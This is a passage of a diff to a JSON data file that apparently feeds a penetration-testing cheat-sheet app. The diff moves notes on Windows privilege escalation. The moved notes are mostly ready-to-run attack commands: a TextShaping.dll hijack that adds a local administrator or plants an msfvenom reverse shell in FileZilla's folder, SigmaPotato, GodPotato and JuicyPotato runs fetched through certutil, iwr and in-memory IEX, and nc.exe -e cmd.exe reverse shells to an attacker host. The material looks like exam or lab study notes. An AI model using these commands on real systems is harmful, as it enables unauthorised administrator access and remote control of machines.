             "AD-focused SMB commands: [[../Active Directory/Enumeration/SMB Enum]]",
             "Service-level SMB workflow: [[Services/135, 445 - SMB]]",
-            "If you have creds already: [[Post_Creds_Enum]]"
+            "If you have creds already: [[../Active Directory/Post-Creds Enum]]"
           ]
         }
       ]
@@ -14041,76 +14106,6 @@
           "type": "code",
           "lang": "sh",
           "text": "wpscan --url http://<TARGET_IP>\nwpscan --url http://<TARGET_IP> --enumerate u,p,t\nwpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>"
-        }
-      ]
-    },
-    {
-      "id": "note-if-stuck-md",
-      "title": "If Stuck",
-      "source": "If Stuck!!.md",
-      "tab": "Enum",
-      "type": "note",
-      "tags": [
-        "Troubleshooting"
-      ],
-      "blocks": [
-        {
-          "type": "list",
-          "items": [
-            "Re-check enum notes: [[Enumeration/00_Index]]",
-            "Look for default creds or password guessing paths: [[Initial Access/00_Index]]",
-            "Revisit credentials and hashes: [[Credentials/00_Index]]",
-            "If you have a shell, move through post-exploitation and privesc: [[Post-Exploitation/00_Index]], [[Privilege Escalation/00_Index]]",
-            "If AD ports are present, follow the AD flow: [[Active Directory/00_Index]]"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "trip"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Google when this fails.",
-            "Enumerate users, crack every hash, spray credentials.",
-            "`searchsploit` every non-standard app, permission, or group that you find."
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "if stuck on AD Privilege Escalation & Post-Exploitation"
-        },
-        {
-          "type": "code",
-          "lang": "",
-          "text": "ถ้า BloodHound หรือ tools ปกติใช้ไม่ได้ → กลับไปโฟกัสพื้นฐาน Windows privesc\n\nเทคนิคที่มักถูกมองข้ามแต่เจอบ่อย:\n\t- Service Binary Hijacking\n\t- DLL Hijacking\n\t- Credentials ซ่อนใน ProgramData\n\t- Registry Autoruns\n\t- Scheduled Tasks"
-        },
-        {
-          "type": "paragraph",
-          "text": "if stuck on Standalone Exploit failed"
-        },
-        {
-          "type": "code",
-          "lang": "",
-          "text": "ReCheck:\n\t- Architecture (x86/x64)\n\t- OS version ของ target\n\t- การแก้/ฝัง shellcode ถูกต้องไหม\n- บ่อยครั้งเป็นแค่ tweak เล็ก ๆ ที่ทำให้ exploit ใช้งานได้"
-        },
-        {
-          "type": "paragraph",
-          "text": "if stuck on Standalone Privilege Escalation"
-        },
-        {
-          "type": "code",
-          "lang": "",
-          "text": "- ถ้ามีหลาย vector ดู promising แต่ exploit ไม่ได้:\n\t→ แปลว่ายัง enum ไม่ครบ\n- วิธีแก้:\n\t- กลับไป enumerate ใหม่ทั้งหมด\n\t- ดูสิ่งที่เคยมองข้ามหรือคิดว่าไม่สำคัญอีกครั้ง"
-        },
-        {
-          "type": "paragraph",
-          "text": "step to check"
-        },
-        {
-          "type": "code",
-          "lang": "",
-          "text": "powerup.ps1 -> sharpup.exe -> winpeas"
         }
       ]
     },
@@ -16059,7 +16054,7 @@
     },
     {
       "id": "note-post-exploitation-linux-post-exploitation-md",
-      "title": "Linux Enum",
+      "title": "Linux Post-Exploitation",
       "source": "Post-Exploitation/Linux Post-Exploitation.md",
       "tab": "Post-Exploitation",
       "type": "note",
@@ -16767,89 +16762,6 @@
           "type": "list",
           "items": [
             "If local admin: check [[Persistence]] for user/remote access persistence options."
-          ]
-        }
-      ]
-    },
-    {
-      "id": "note-exploitation-textshaping-md",
-      "title": "TextShaping DLL Hijack",
-      "source": "Exploitation/TextShaping.md",
-      "tab": "Privesc",
-      "type": "note",
-      "tags": [
-        "Windows",
-        "PrivilegeEscalation"
-      ],
-      "blocks": [
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "When"
-        },
-        {
-          "type": "list",
-          "items": [
-            "A privileged Windows application loads `TextShaping.dll`.",
-            "You can write to the application's install directory.",
-            "Restarting the application or service causes the DLL to load again."
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Add Local Admin DLL"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Step-by-step `TextShaping.dll` hijack to add a local admin user."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "# 1. Attacker: create TextShaping.cpp with the local-admin DLL body.\ncat > TextShaping.cpp <<'EOF'\n#include <stdlib.h>\n#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {\n        system(\"net user <USER> <PASS> /add\");\n        system(\"net localgroup Administrators <USER> /add\");\n    }\n    return TRUE;\n}\nEOF\n\n# 2. Attacker: compile and host the DLL.\nx86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll\npython -m http.server 80\n\n# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.\niwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll'\n\n# 4. Target PowerShell: restart the application so the hijacked DLL is loaded.\nStop-Process -Name filezilla -Force\nStart-Process 'C:\\FileZilla\\FileZilla FTP Client\\filezilla.exe'\nwhoami"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Reverse Shell DLL"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Step-by-step `TextShaping.dll` hijack to get a reverse shell instead of adding a user."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "# 1. Attacker: generate a DLL reverse shell payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o TextShaping.dll\n\n# 2. Attacker: start a listener and host the DLL.\nnc -lvnp <LPORT>\npython -m http.server 80\n\n# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.\niwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll'\n\n# 4. Target PowerShell: restart the application to trigger the payload.\nStop-Process -Name filezilla -Force\nStart-Process 'C:\\FileZilla\\FileZilla FTP Client\\filezilla.exe'"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Notes"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Validate the DLL load path first with Procmon or another process monitor.",
-            "This is most useful when the application starts elevated or as another user.",
-            "If the app is launched by a low-privileged user, the shell/user you get will match that context."
           ]
         }
       ]
@@ -18249,6 +18161,246 @@
       ]
     },
     {
+      "id": "note-privilege-escalation-potato-family-md",
+      "title": "Potato Family",
+      "source": "Privilege Escalation/Potato Family.md",
+      "tab": "Privesc",
+      "type": "note",
+      "tags": [
+        "Windows",
+        "PrivilegeEscalation"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "When"
+        },
+        {
+          "type": "list",
+          "items": [
+            "You already have code execution on a Windows host.",
+            "`whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.",
+            "Common contexts: IIS app pool, `LocalService`, `NetworkService`, or another service account."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "SigmaPotato"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "SigmaPotato EXE"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Check privileges, download SigmaPotato, and use it for admin or shell access."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Confirm impersonation-related privileges first.\nwhoami /priv\n\n# Download SigmaPotato to disk.\niwr -Uri http://<LHOST>/SigmaPotato.exe -OutFile SigmaPotato.exe\ncertutil.exe -urlcache -f http://<LHOST>/SigmaPotato.exe SigmaPotato.exe\n\n# Add a local admin user.\n.\\SigmaPotato.exe \"net user <USER> <PASS> /add\"\n.\\SigmaPotato.exe \"net localgroup Administrators <USER> /add\"\n\n# Or run a single command / reverse shell instead.\n.\\SigmaPotato.exe \"<COMMAND>\"\n.\\SigmaPotato.exe --revshell <LHOST> <LPORT>\n\n# Quick proof/local flag checks.\n.\\SigmaPotato.exe \"cmd.exe /c whoami & hostname & type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig\"\n.\\SigmaPotato.exe \"cmd.exe /c whoami & hostname & type C:\\Users\\<USER>\\local.txt & ipconfig\""
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "SigmaPotato In Memory"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PowerShell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Load SigmaPotato into memory and execute a command or reverse shell."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(\"http://<LHOST>/SigmaPotato.exe\"))\n[SigmaPotato]::Main(\"<COMMAND>\")\n[SigmaPotato]::Main(@(\"--revshell\",\"<LHOST>\",\"<LPORT>\"))"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "SigmaPotato PowerShell Wrapper"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "PowerShell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Download and run the PowerShell SigmaPotato wrapper when PowerShell execution is available."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Attacker: download the wrapper and host it.\nwget https://github.com/tylerdotrar/SigmaPotato/raw/refs/heads/main/Invoke-SigmaPotato.ps1 -O Invoke-SigmaPotato.ps1\npython3 -m http.server 80\n\n# Target: download and import the wrapper.\niwr -Uri http://<LHOST>/Invoke-SigmaPotato.ps1 -OutFile Invoke-SigmaPotato.ps1\n. .\\Invoke-SigmaPotato.ps1\n\n# Or import it in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/Invoke-SigmaPotato.ps1') | IEX\n\n# Target: execute a command or reverse shell.\nInvoke-SigmaPotato -Command \"<COMMAND>\"\nInvoke-SigmaPotato -Command \"net user <USER> <PASS> /add\"\nInvoke-SigmaPotato -Command \"net localgroup Administrators <USER> /add\"\nInvoke-SigmaPotato -Command \"--revshell <LHOST> <LPORT>\""
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "GodPotato"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use GodPotato when impersonation privileges are available on newer Windows builds."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Confirm impersonation-related privileges first.\nwhoami /priv\n\n# Download GodPotato to disk.\ncertutil.exe -urlcache -f http://<LHOST>/GodPotato.exe GodPotato.exe\niwr -Uri http://<LHOST>/GodPotato.exe -OutFile GodPotato.exe\n\n# Execute a quick proof command.\n.\\GodPotato.exe -cmd \"cmd /c whoami\"\n\n# Trigger a reverse shell command.\n.\\GodPotato.exe -cmd \"cmd /c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\""
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "JuicyPotato"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use JuicyPotato on older Windows builds when CLSID-based COM abuse is viable."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Quick test with the default CLSID.\n.\\JuicyPotato.exe -t * -p C:\\temp\\shell.exe -l 443\n\n# Download JuicyPotato and nc.exe.\ncertutil.exe -urlcache -f http://<LHOST>/JuicyPotato.exe JuicyPotato.exe\ncertutil.exe -urlcache -f http://<LHOST>/nc.exe nc.exe\n\n# Spawn a SYSTEM reverse shell.\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\" -t *\n\n# If needed, test a known CLSID explicitly.\n.\\JuicyPotato.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\" -t *"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Notes"
+        },
+        {
+          "type": "list",
+          "items": [
+            "SigmaPotato is usually the first thing to try on newer Windows builds.",
+            "GodPotato is also useful on newer Windows builds with impersonation privileges.",
+            "JuicyPotato is mainly useful on older Windows / Server versions.",
+            "If the target blocks `nc.exe`, use a staged PowerShell command instead of `cmd.exe /c ...`."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "note-privilege-escalation-textshaping-dll-hijack-md",
+      "title": "TextShaping DLL Hijack",
+      "source": "Privilege Escalation/TextShaping DLL Hijack.md",
+      "tab": "Privesc",
+      "type": "note",
+      "tags": [
+        "Windows",
+        "PrivilegeEscalation"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "When"
+        },
+        {
+          "type": "list",
+          "items": [
+            "A privileged Windows application loads `TextShaping.dll`.",
+            "You can write to the application's install directory.",
+            "Restarting the application or service causes the DLL to load again."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Add Local Admin DLL"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Step-by-step `TextShaping.dll` hijack to add a local admin user."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# 1. Attacker: create TextShaping.cpp with the local-admin DLL body.\ncat > TextShaping.cpp <<'EOF'\n#include <stdlib.h>\n#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {\n        system(\"net user <USER> <PASS> /add\");\n        system(\"net localgroup Administrators <USER> /add\");\n    }\n    return TRUE;\n}\nEOF\n\n# 2. Attacker: compile and host the DLL.\nx86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll\npython -m http.server 80\n\n# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.\niwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll'\n\n# 4. Target PowerShell: restart the application so the hijacked DLL is loaded.\nStop-Process -Name filezilla -Force\nStart-Process 'C:\\FileZilla\\FileZilla FTP Client\\filezilla.exe'\nwhoami"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Reverse Shell DLL"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Windows",
+            "PrivilegeEscalation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Step-by-step `TextShaping.dll` hijack to get a reverse shell instead of adding a user."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# 1. Attacker: generate a DLL reverse shell payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o TextShaping.dll\n\n# 2. Attacker: start a listener and host the DLL.\nnc -lvnp <LPORT>\npython -m http.server 80\n\n# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.\niwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll'\n\n# 4. Target PowerShell: restart the application to trigger the payload.\nStop-Process -Name filezilla -Force\nStart-Process 'C:\\FileZilla\\FileZilla FTP Client\\filezilla.exe'"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Notes"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Validate the DLL load path first with Procmon or another process monitor.",
+            "This is most useful when the application starts elevated or as another user.",
+            "If the app is launched by a low-privileged user, the shell/user you get will match that context."
+          ]
+        }
+      ]
+    },
+    {
       "id": "note-privilege-escalation-windows-privilege-escalation-md",
       "title": "Windows Privilege Escalation",
       "source": "Privilege Escalation/Windows Privilege Escalation.md",
@@ -19005,163 +19157,6 @@
           "type": "code",
           "lang": "sh",
           "text": "impacket-psexec '<USER>:<PASS>'@<TARGET_IP>"
-        }
-      ]
-    },
-    {
-      "id": "note-tools-potato-family-md",
-      "title": "Potato Family",
-      "source": "Tools/Potato Family.md",
-      "tab": "Privesc",
-      "type": "note",
-      "tags": [
-        "Windows",
-        "PrivilegeEscalation"
-      ],
-      "blocks": [
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "When"
-        },
-        {
-          "type": "list",
-          "items": [
-            "You already have code execution on a Windows host.",
-            "`whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.",
-            "Common contexts: IIS app pool, `LocalService`, `NetworkService`, or another service account."
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "SigmaPotato"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "SigmaPotato EXE"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Check privileges, download SigmaPotato, and use it for admin or shell access."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "# Confirm impersonation-related privileges first.\nwhoami /priv\n\n# Download SigmaPotato to disk.\niwr -Uri http://<LHOST>/SigmaPotato.exe -OutFile SigmaPotato.exe\ncertutil.exe -urlcache -f http://<LHOST>/SigmaPotato.exe SigmaPotato.exe\n\n# Add a local admin user.\n.\\SigmaPotato.exe \"net user <USER> <PASS> /add\"\n.\\SigmaPotato.exe \"net localgroup Administrators <USER> /add\"\n\n# Or run a single command / reverse shell instead.\n.\\SigmaPotato.exe \"<COMMAND>\"\n.\\SigmaPotato.exe --revshell <LHOST> <LPORT>\n\n# Quick proof/local flag checks.\n.\\SigmaPotato.exe \"cmd.exe /c whoami & hostname & type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig\"\n.\\SigmaPotato.exe \"cmd.exe /c whoami & hostname & type C:\\Users\\<USER>\\local.txt & ipconfig\""
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "SigmaPotato In Memory"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PowerShell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Load SigmaPotato into memory and execute a command or reverse shell."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(\"http://<LHOST>/SigmaPotato.exe\"))\n[SigmaPotato]::Main(\"<COMMAND>\")\n[SigmaPotato]::Main(@(\"--revshell\",\"<LHOST>\",\"<LPORT>\"))"
-        },
-        {
-          "type": "heading",
-          "depth": 3,
-          "text": "SigmaPotato PowerShell Wrapper"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "PowerShell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Download and run the PowerShell SigmaPotato wrapper when PowerShell execution is available."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "# Attacker: download the wrapper and host it.\nwget https://github.com/tylerdotrar/SigmaPotato/raw/refs/heads/main/Invoke-SigmaPotato.ps1 -O Invoke-SigmaPotato.ps1\npython3 -m http.server 80\n\n# Target: download and import the wrapper.\niwr -Uri http://<LHOST>/Invoke-SigmaPotato.ps1 -OutFile Invoke-SigmaPotato.ps1\n. .\\Invoke-SigmaPotato.ps1\n\n# Or import it in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/Invoke-SigmaPotato.ps1') | IEX\n\n# Target: execute a command or reverse shell.\nInvoke-SigmaPotato -Command \"<COMMAND>\"\nInvoke-SigmaPotato -Command \"net user <USER> <PASS> /add\"\nInvoke-SigmaPotato -Command \"net localgroup Administrators <USER> /add\"\nInvoke-SigmaPotato -Command \"--revshell <LHOST> <LPORT>\""
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "GodPotato"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Use GodPotato when impersonation privileges are available on newer Windows builds."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "# Confirm impersonation-related privileges first.\nwhoami /priv\n\n# Download GodPotato to disk.\ncertutil.exe -urlcache -f http://<LHOST>/GodPotato.exe GodPotato.exe\niwr -Uri http://<LHOST>/GodPotato.exe -OutFile GodPotato.exe\n\n# Execute a quick proof command.\n.\\GodPotato.exe -cmd \"cmd /c whoami\"\n\n# Trigger a reverse shell command.\n.\\GodPotato.exe -cmd \"cmd /c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\""
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "JuicyPotato"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "PrivilegeEscalation"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Use JuicyPotato on older Windows builds when CLSID-based COM abuse is viable."
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "# Quick test with the default CLSID.\n.\\JuicyPotato.exe -t * -p C:\\temp\\shell.exe -l 443\n\n# Download JuicyPotato and nc.exe.\ncertutil.exe -urlcache -f http://<LHOST>/JuicyPotato.exe JuicyPotato.exe\ncertutil.exe -urlcache -f http://<LHOST>/nc.exe nc.exe\n\n# Spawn a SYSTEM reverse shell.\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\" -t *\n\n# If needed, test a known CLSID explicitly.\n.\\JuicyPotato.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Users\\Public\\nc.exe -e cmd.exe <LHOST> <LPORT>\" -t *"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Notes"
-        },
-        {
-          "type": "list",
-          "items": [
-            "SigmaPotato is usually the first thing to try on newer Windows builds.",
-            "GodPotato is also useful on newer Windows builds with impersonation privileges.",
-            "JuicyPotato is mainly useful on older Windows / Server versions.",
-            "If the target blocks `nc.exe`, use a staged PowerShell command instead of `cmd.exe /c ...`."
-          ]
         }
       ]
     },
